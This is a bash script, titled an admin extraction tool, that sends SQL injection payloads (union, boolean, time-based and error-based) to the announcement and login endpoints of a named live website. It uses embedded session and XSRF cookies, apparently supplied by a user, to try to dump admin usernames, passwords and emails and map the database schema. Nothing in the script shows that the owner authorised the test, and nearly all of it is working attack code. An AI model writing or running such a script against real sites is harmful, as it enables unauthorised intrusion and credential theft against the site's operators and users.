#!/bin/bash

echo "🎯 LATEST TOKEN ADMIN EXTRACTION - FRESH TOKENS"
echo "==============================================="

# Use the latest fresh tokens provided by user
XSRF_TOKEN="eyJpdiI6Ik1LTTd3cytldWQ1UjVYMVFpUWVkNVE9PSIsInZhbHVlIjoiNituTk80MkZSbU9EOFJhcGROWnl5WGJQRTU4clhOXC9nbXp3Z1M3bUdPQlNyUWluUHBUR1o2OXB2Z3N1Y0dCVnQiLCJtYWMiOiJhMWM2MTk0MmEzOWJkZmIzMjA5NzNiMTE4OTYwMGQ5M2FhYWYxYThhNzAzYWNkYzM3MDU2OGFjNjIyZTZlODg4In0%3D"
SESSION_TOKEN="eyJpdiI6ImJ2TXBqNUlKS0JJaW5xWDV3WU1aNVE9PSIsInZhbHVlIjoiaVErUENTNXFycFVoZEdPUzNXaVNqTEpxM3M5a015NFRmcVdwUmFQMHJyVHhJdzE4S1cySVBnZ08ySUZ6a0xrVSIsIm1hYyI6IjhkZDA4ODFlYTk0NGYzNzkzNDI3ZWJjOTI0ZGRkZTY2OTU0NWIzOTI1ZjU2MDYwYTViYjY0OThkMTVmMTM1NzgifQ%3D%3D"

BASE_URL="https://member.panama8888b.co"
ANNOUNCEMENT_URL="$BASE_URL/api/announcement"
LOGIN_URL="$BASE_URL/auth/login"

echo "🔍 Phase 1: Testing Fresh Tokens on Announcement Endpoint"
echo "========================================================"

# Test the announcement endpoint with fresh tokens
echo "📊 Testing Announcement Endpoint with Fresh Tokens..."
response=$(curl -s -w "%{http_code}" -o /tmp/fresh_announcement.txt \
  -X POST "$ANNOUNCEMENT_URL" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "{\"id\":\"1' UNION SELECT username,password,email FROM users WHERE role='admin'--\"}")

http_code=$(echo "$response" | tail -n1)
content=$(cat /tmp/fresh_announcement.txt)

echo "   HTTP Code: $http_code"
echo "   Content Length: ${#content}"
echo "   Content: $content"
echo ""

echo "🔍 Phase 2: Advanced SQL Injection with Fresh Tokens"
echo "==================================================="

# Test various SQL injection payloads with fresh tokens
PAYLOADS=(
    "1' UNION SELECT username,password,email FROM users WHERE role='admin' LIMIT 1--"
    "1' UNION SELECT username,password,email,id FROM users WHERE role='admin' LIMIT 1--"
    "1' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0--"
    "1' AND (SELECT username FROM users WHERE role='admin' LIMIT 1) IS NOT NULL--"
    "1' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_schema='public'--"
    "1' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_name='users'--"
)

for i in "${!PAYLOADS[@]}"; do
    payload="${PAYLOADS[$i]}"
    echo "📊 Testing Payload $((i+1)): $payload"
    
    response=$(curl -s -w "%{http_code}" -o /tmp/fresh_payload_$i.txt \
      -X POST "$ANNOUNCEMENT_URL" \
      -H "Content-Type: application/json" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
      -d "{\"id\":\"$payload\"}")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/fresh_payload_$i.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🔍 Phase 3: Login Endpoint with Fresh Tokens"
echo "==========================================="

# Test login endpoint with fresh tokens
echo "📊 Testing Login Endpoint with Fresh Tokens..."
login_response=$(curl -s -w "%{http_code}" -o /tmp/fresh_login.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "_token=7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT username,password,email FROM users WHERE role='admin'--")

login_http_code=$(echo "$login_response" | tail -n1)
login_content=$(cat /tmp/fresh_login.txt)

echo "   HTTP Code: $login_http_code"
echo "   Content Length: ${#login_content}"
echo "   Content: $login_content"
echo ""

echo "🔍 Phase 4: Time-based Injection with Fresh Tokens"
echo "================================================="

# Test time-based injection
echo "📊 Testing Time-based Injection with Fresh Tokens..."
time_test=$(curl -s -w "%{time_total}" -o /tmp/fresh_time.txt \
  -X POST "$ANNOUNCEMENT_URL" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "{\"id\":\"1' AND (SELECT SLEEP(3) FROM users WHERE role='admin' LIMIT 1)--\"}")

echo "   Response Time: ${time_test}s"

echo ""
echo "🔍 Phase 5: Error-based Injection with Fresh Tokens"
echo "=================================================="

# Test error-based injection
ERROR_PAYLOADS=(
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,0x3a,password,0x3a,email,FLOOR(RAND(0)*2))x FROM users WHERE role='admin' GROUP BY x)x)--"
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(table_name,0x3a,column_name,0x3a,data_type,FLOOR(RAND(0)*2))x FROM information_schema.columns WHERE table_schema='public' GROUP BY x)x)--"
)

for i in "${!ERROR_PAYLOADS[@]}"; do
    payload="${ERROR_PAYLOADS[$i]}"
    echo "📊 Testing Error Payload $((i+1)): $payload"
    
    response=$(curl -s -w "%{http_code}" -o /tmp/fresh_error_$i.txt \
      -X POST "$ANNOUNCEMENT_URL" \
      -H "Content-Type: application/json" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
      -d "{\"id\":\"$payload\"}")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/fresh_error_$i.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🎯 ANALYSIS RESULTS WITH FRESH TOKENS"
echo "===================================="

# Check for successful responses
success_count=0
total_tests=0

# Check announcement endpoint
if [ -f "/tmp/fresh_announcement.txt" ]; then
    content=$(cat /tmp/fresh_announcement.txt)
    total_tests=$((total_tests + 1))
    
    if [ "${#content}" -gt 100 ] && [[ "$content" != *"Page Expired"* ]] && [[ "$content" != *"Not Found"* ]]; then
        success_count=$((success_count + 1))
        echo "✅ Potential success found in announcement endpoint"
        echo "   Content: $content"
    fi
fi

# Check payload responses
for i in "${!PAYLOADS[@]}"; do
    if [ -f "/tmp/fresh_payload_$i.txt" ]; then
        content=$(cat "/tmp/fresh_payload_$i.txt")
        total_tests=$((total_tests + 1))
        
        if [ "${#content}" -gt 100 ] && [[ "$content" != *"Page Expired"* ]] && [[ "$content" != *"Not Found"* ]]; then
            success_count=$((success_count + 1))
            echo "✅ Potential success found in payload $((i+1))"
            echo "   Content: $content"
        fi
    fi
done

# Check login response
if [ -f "/tmp/fresh_login.txt" ]; then
    content=$(cat /tmp/fresh_login.txt)
    total_tests=$((total_tests + 1))
    
    if [ "${#content}" -gt 100 ] && [[ "$content" != *"Page Expired"* ]] && [[ "$content" != *"Not Found"* ]]; then
        success_count=$((success_count + 1))
        echo "✅ Potential success found in login endpoint"
        echo "   Content: $content"
    fi
fi

# Check error responses
for i in "${!ERROR_PAYLOADS[@]}"; do
    if [ -f "/tmp/fresh_error_$i.txt" ]; then
        content=$(cat "/tmp/fresh_error_$i.txt")
        total_tests=$((total_tests + 1))
        
        if [ "${#content}" -gt 100 ] && [[ "$content" != *"Page Expired"* ]] && [[ "$content" != *"Not Found"* ]]; then
            success_count=$((success_count + 1))
            echo "✅ Potential success found in error payload $((i+1))"
            echo "   Content: $content"
        fi
    fi
done

echo ""
echo "📊 SUCCESS RATE WITH FRESH TOKENS: $success_count/$total_tests"

if [ "$success_count" -gt 0 ]; then
    echo "🎉 POTENTIAL VULNERABILITY DETECTED WITH FRESH TOKENS!"
    echo "   Some payloads may have successfully extracted data"
else
    echo "❌ No clear vulnerabilities detected with fresh tokens"
fi

# Check time-based injection
if (( $(echo "$time_test > 2" | bc -l 2>/dev/null || echo "0") )); then
    echo "✅ TIME-BASED INJECTION SUCCESSFUL WITH FRESH TOKENS!"
    echo "   Response time: ${time_test}s indicates SQL execution"
else
    echo "❌ Time-based injection may be blocked even with fresh tokens"
fi

echo ""
echo "📋 SUMMARY WITH FRESH TOKENS"
echo "============================"
echo "Target URLs: $ANNOUNCEMENT_URL, $LOGIN_URL"
echo "Method: POST with fresh XSRF and Session tokens"
echo "Technique: Union-based, Boolean-based, Time-based, Error-based SQL Injection"
echo "Status: Testing with latest fresh authentication tokens"

# Clean up temp files
rm -f /tmp/fresh_*.txt

echo ""
echo "🎯 LATEST TOKEN ADMIN EXTRACTION COMPLETED!"